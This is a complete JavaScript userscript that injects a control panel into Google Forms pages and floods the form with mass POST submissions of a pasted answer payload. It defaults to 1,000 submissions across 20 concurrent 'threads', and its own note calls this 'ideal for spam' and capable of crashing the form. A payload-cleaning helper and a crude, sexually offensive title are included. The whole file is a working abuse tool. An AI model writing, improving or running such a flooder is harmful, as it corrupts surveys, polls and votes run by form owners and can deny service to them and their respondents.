(() => {
  if (document.getElementById("form-spammer-panel")) return;

  const panel = document.createElement("div");
  panel.id = "form-spammer-panel";
  panel.innerHTML = `
    <button id="close-panel" title="Close">✖</button>

    <style>
      @import url('https://fonts.googleapis.com/css2?family=Comic+Neue:wght@400;700&display=swap');

      :root {
        --fog-shadow: 1px 1px 4px rgba(0, 0, 0, 1);
      }

      #form-spammer-panel {
        position: fixed;
        top: 20px;
        right: 20px;
        background: rgba(255, 255, 255, 0.1);
        border: 1px solid #d1d5db;
        border-radius: 8px;
        padding: 15px;
        width: 300px;
        z-index: 999999;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        font-family: 'Segoe UI', sans-serif;
        font-size: 14px;
        font-weight: bold;
        color: #f1f5f9;
        background-image: url('https://i.imgur.com/yAzfZE7.jpeg');
        background-size: cover;
        background-position: center;
        backdrop-filter: blur(4px);
        text-shadow: var(--fog-shadow);
      }

      #form-spammer-panel h3 {
        text-shadow: var(--fog-shadow);
        color: #fff;
        font-size: 18px;
      }

      #form-spammer-panel label,
      #form-spammer-panel input,
      #form-spammer-panel textarea,
      #form-spammer-panel button,
      #form-spammer-panel code,
      #form-spammer-panel em,
      .field-block,
      .small-note,
      #progress-counter {
        text-shadow: var(--fog-shadow);
        color: #fff;
      }

      #form-spammer-panel input,
      #form-spammer-panel textarea,
      #form-spammer-panel button {
        width: calc(100% - 2px);
        margin: 5px 0;
        padding: 8px;
        border-radius: 6px;
        font-size: 14px;
        box-sizing: border-box;
      }

      #form-spammer-panel input,
      #form-spammer-panel textarea {
        background: rgba(255, 255, 255, 0.4);
        color: #ffffff;
        border: 1px solid #ffffff30;
        outline: none;
      }

      #form-spammer-panel input::placeholder,
      #form-spammer-panel textarea::placeholder {
        color: #f0f0f0;
        text-shadow: var(--fog-shadow);
      }

      #form-spammer-panel button {
        background-color: #ffffff;
        color: #000000;
        font-weight: 600;
        cursor: pointer;
        border: none;
        text-shadow: none !important;
      }

      #form-spammer-panel button:hover {
        background-color: #f3f4f6;
      }

      .field-block {
        background: rgba(255, 255, 255, 0.05);
        padding: 8px;
        margin-bottom: 8px;
        border-radius: 6px;
      }

      #progress-counter {
        text-align: center;
        font-weight: bold;
        margin: 10px 0;
      }

      .small-note {
        font-family: 'Comic Neue', cursive;
        font-size: 12px;
        margin-top: -2px;
        margin-bottom: 8px;
        background: rgba(255, 255, 255, 0.1);
        padding: 4px 6px;
        border-radius: 6px;
      }

      #close-panel {
        position: absolute !important;
        top: 6px !important;
        right: 10px !important;
        background: transparent !important;
        border: none !important;
        padding: 0 !important;
        margin: 0 !important;
        width: auto !important;
        height: auto !important;
        font-size: 18px !important;
        font-weight: bold !important;
        color: white !important;
        cursor: pointer !important;
        line-height: 1 !important;
        text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.6) !important;
        z-index: 1000000 !important;
      }

      #close-panel:hover {
        color: #f87171 !important;
      }
    </style>

    <h3>kawaii gogle form raper (≧◡≦)</h3>
    <label for="form-payload">paste payload to send</label>
    <textarea id="form-payload" placeholder="e.g. entry.123=value&entry.456=value"></textarea>
    <label for="form-count">Total submissions</label>
    <input type="number" id="form-count" value="1000" min="1" placeholder="e.g. 99999999" />
    <label for="thread-count">Threads</label>
    <input type="number" id="thread-count" value="20" min="1" placeholder="e.g. 20" />
    <div class="small-note">⚠️ 20 threads is ideal for spam. any more will be more prone to rate limits, but will birth potential to crashing the form itself. repeated use will also risk rate limiting.</div>
    <button id="form-submit">(//ω//) start !!1</button>
    <div id="progress-counter">0/0</div>

    <hr style="margin: 15px 0; border-color: rgba(255, 255, 255, 0.2);">
    <h3>payload cleaner</h3>
    <label for="clean-input">paste full payload here to clean</label>
    <textarea id="clean-input" placeholder="e.g. entry.123=value&entry.456=value"></textarea>
    <button id="clean-button">clean my load</button>
    <label for="clean-output">cleaned result</label>
    <textarea id="clean-output" placeholder="cleaned result will appear here"></textarea>
  `;

  document.body.appendChild(panel);

  const log = document.getElementById("progress-counter");
  const counter = document.getElementById("progress-counter");

  const detectFormUrl = () => {
    const form = document.querySelector("form[action*='formResponse']");
    return form ? new URL(form.action).href : null;
  };

  const cleanPayload = (raw) => {
    return raw
      .split("&")
      .filter(pair => /^entry\.\d+=/.test(pair))
      .join("&");
  };

  document.getElementById("form-submit").addEventListener("click", async () => {
    const url = detectFormUrl();
    const rawPayload = document.getElementById("form-payload").value.trim();
    const totalCount = parseInt(document.getElementById("form-count").value);
    const threadCount = parseInt(document.getElementById("thread-count").value);

    if (!url || !rawPayload || isNaN(totalCount) || isNaN(threadCount)) {
      log.textContent = "❌ invalid form URL/payload. make sure ur on the form submission page not the response page.";
      return;
    }

    const cleaned = cleanPayload(rawPayload);
    if (!cleaned) {
      log.textContent = "❌ no valid answer fields found (entry.xxx=...). (×﹏×)";
      return;
    }

    log.textContent = "starting with cleaned payloads...";
    counter.textContent = `0/${totalCount}`;

    const submissionsPerThread = Math.ceil(totalCount / threadCount);
    let completed = 0;

    const submitBatch = async (batchSize) => {
      for (let i = 0; i < batchSize; i++) {
        try {
          const res = await fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            body: cleaned
          });
          completed++;
          counter.textContent = `${completed}/${totalCount}`;
          if (!res.ok) {
            log.textContent += `\n❌ ${completed}/${totalCount} - ${res.status}`;
          }
        } catch (err) {
          completed++;
          counter.textContent = `${completed}/${totalCount}`;
          log.textContent += `\n❌ ${completed}/${totalCount} - ${err.message}`;
        }
      }
    };

    const threads = [];
    for (let i = 0; i < threadCount; i++) {
      const batchSize = i === threadCount - 1 ? totalCount - (threadCount - 1) * submissionsPerThread : submissionsPerThread;
      threads.push(submitBatch(batchSize));
    }

    await Promise.all(threads);
    log.textContent += "\n finished !!  o(＞＜ = ＞＜)o ";
  });

  document.getElementById("clean-button").addEventListener("click", () => {
    const raw = document.getElementById("clean-input").value.trim();
    const cleaned = cleanPayload(raw);
    document.getElementById("clean-output").value = cleaned || "no valid entry.xxx=... fields found.";
  });

  document.getElementById("close-panel").addEventListener("click", () => {
    document.getElementById("form-spammer-panel").remove();
  });
})();
